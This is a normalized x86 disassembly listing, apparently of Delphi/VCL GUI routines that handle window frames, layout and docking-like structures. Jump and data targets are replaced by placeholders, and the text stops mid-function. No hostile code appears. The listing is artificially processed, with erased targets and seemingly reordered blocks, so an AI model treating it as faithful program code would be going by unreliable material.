mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] esi
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov [ ebp - 0x2c ] esi
mov esi [ esi + 0x18 ]
mov eax [ ebp - 0x2c ]
call sub_403f64
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x24 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x24 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
sub_4470d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_415370
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
push 0x0
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42455c
push eax
call DrawFrameControl
call sub_42f0b8
lea ecx [ ebp - 0xc ]
mov dl 0x34
call sub_42f400
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42455c
push eax
call sub_42f0b8
lea ecx [ ebp - 0xc ]
pop edx
call sub_42f27c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447164
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423be8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_424308
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx edi
call sub_4242a8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_4242a8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423be8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_4242a8
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4242a8
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4471ec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax esi
call sub_415370
call sub_42f0b8
lea ecx [ ebp - 0xc ]
mov edx ebx
call sub_42f364
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_42455c
push eax
call sub_42f0b8
lea ecx [ ebp - 0xc ]
pop edx
call sub_42f27c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_447248
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4470d0
pop ecx
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4470d0
pop ecx
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_447164
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_447164
pop ecx
push ebp
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x18 ]
sub edx 0x2
push edx
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0xa
push edx
mov ecx eax
inc ecx
mov edx [ ebx ]
add edx 0x2
mov al 0x2
call sub_4471ec
pop ecx
jmp r-xdata
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_447164
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_447164
pop ecx
jmp r-xdata
push ebp
mov eax [ ebx ]
mov edx eax
add edx 0xa
push edx
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x18 ]
inc ecx
mov edx eax
inc edx
mov al 0x3
call sub_4471ec
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_44739c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424018
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4474c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43a9e4
mov eax [ ebp - 0x4 ]
call sub_4242e0
xor eax eax
push ebp
push sub_4474a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4245e4
xor eax eax
push ebp
push sub_447486
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_43ff78
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44748d
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4245e4
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0x94 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_43ff3c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43ba58
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
sub_4474d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_442630
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43baf8
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43bab4
mov ecx eax
xor edx edx
xor eax eax
call sub_415370
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_443be8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx eax [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0xc
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
movzx edx [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0x8
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415398
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_44764c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44764c
pop ecx
mov eax ebx
call sub_403f64
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44764c
pop ecx
sub_447680
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_44764c
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403f64
xor eax eax
mov [ esi + 0x64 ] eax
sub_4476dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4464c8
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44771c
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x90 ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
sub_44771c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4479ad
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x8 ]
pop eax
call sub_40512c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov eax [ ebx + 0x14 ]
call sub_445c1c
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x10 ]
pop eax
call sub_40512c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4479b4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_445ff8
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_446174
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_4461b0
mov eax [ ebx + 0x18 ]
call sub_445ff8
mov [ edx + 0x18 ] eax
push esi
push sub_44802c
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446530
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_4461b0
mov eax [ esi + 0x64 ]
call sub_446174
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403f64
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_448004
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403f64
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_445cd4
mov edx eax
mov eax edi
call sub_44619c
mov eax edi
call sub_445ff8
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403f64
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ edi + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
push esi
push sub_44802c
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446530
jmp r-xdata
mov edx [ edi + 0x8 ]
mov edx [ edx + 0x18 ]
mov [ edx + 0xc ] eax
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push sub_44802c
mov edx [ eax + 0x14 ]
mov eax esi
call sub_446530
mov eax [ ebx + 0x14 ]
call sub_403f64
mov eax edi
call sub_403f64
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_4479bc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_442630
test eax eax
jle r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
movzx edx [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_4091b0
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_44619c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44259c
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_44619c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_447eac
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44802c
xor edx edx
mov eax edi
call sub_446530
sub_447aa4
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_446174
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_403260
mov edx eax
mov eax ebx
call sub_44619c
sub_447ae4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_447b53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b5a
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_447b60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_447c60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebx + 0x20 ]
call sub_4487a0
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_447b60
pop ecx
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_445f00
mov eax [ ebp - 0xc ]
call sub_447ae4
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447c67
lea eax [ ebp - 0xc ]
call sub_404e44
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_447b60
pop ecx
sub_447c70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447e17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
lea edx [ eax + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_447d90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44259c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0x10 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447d97
mov eax [ ebp - 0x14 ]
call sub_403f64
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_447ae4
pop ecx
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_4425b0
mov esi eax
cmp [ esi + 0x57 ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_447d97
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
movzx edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
call sub_4487a0
mov [ ebp - 0xc ] eax
jmp r-xdata
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_447b60
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e1e
lea eax [ ebp - 0x18 ]
call sub_404e44
retn
sub_447e24
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446250
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446278
call sub_447e24
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446250
call sub_447e24
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_445c54
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_446174
mov edx eax
mov eax ebx
call sub_44619c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44619c
jmp r-xdata
sub_447eac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_447e24
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_447ef4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_446174
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_44619c
sub_447f28
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_443be8
mov edx eax
mov eax [ rw-data ]
call sub_448d58
mov eax [ ebx + 0x14 ]
